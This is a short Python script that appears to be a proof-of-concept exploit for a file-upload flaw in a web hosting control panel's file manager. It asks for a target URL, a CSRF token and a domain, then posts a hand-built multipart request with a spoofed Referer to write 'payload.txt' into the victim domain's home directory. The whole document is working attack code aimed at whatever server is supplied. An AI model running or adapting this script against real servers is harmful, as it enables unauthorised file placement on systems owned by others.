import requests

def upload_file():
    target = input("Enter the target server (e.g., https://panel.domain.com): ")
    csrf_token = input("Enter the CSRF token: ")
    domain_name = input("Enter the domain name (e.g., clientdomain.com): ")    

    target_url = f"{target}/filemanager/upload"
    
    payload = f"-----011000010111000001101001\r\nContent-Disposition: form-data; name=\"method:\"\r\n\r\nupload\r\n-----011000010111000001101001\r\nContent-Disposition: form-data; name=\"home\"\r\n\r\n/home/{domain_name}\r\n-----011000010111000001101001\r\nContent-Disposition: form-data; name=\"completePath\"\r\n\r\n/home/{domain_name}\r\n-----011000010111000001101001\r\nContent-Disposition: form-data; name=\"domainRandomSeed\"\r\n\r\n\r\n-----011000010111000001101001\r\nContent-Disposition: form-data; name=\"domainName\"\r\n\r\n{domain_name}\r\n-----011000010111000001101001\r\nContent-Disposition: form-data; name=\"file\"; filename=\"payload.txt\"\r\nContent-Type: text/plain\r\n\r\n\r\n-----011000010111000001101001--\r\n"
   
    headers = {
        "Content-Type": "multipart/form-data; boundary=---011000010111000001101001",
        "Cookie": f"csrftoken={csrf_token};",
        "x-csrftoken": csrf_token,
        "Referer": f"{target}/filemanager/{domain_name}"
    }

    response = requests.post(target_url, data=payload, headers=headers)

    if response.status_code == 200:
        print(f"File uploaded successfully: {response.status_code} - {response.text}")
    else:
        print(f"Failed to upload file: {response.status_code} - {response.text}")

if __name__ == "__main__":
    upload_file()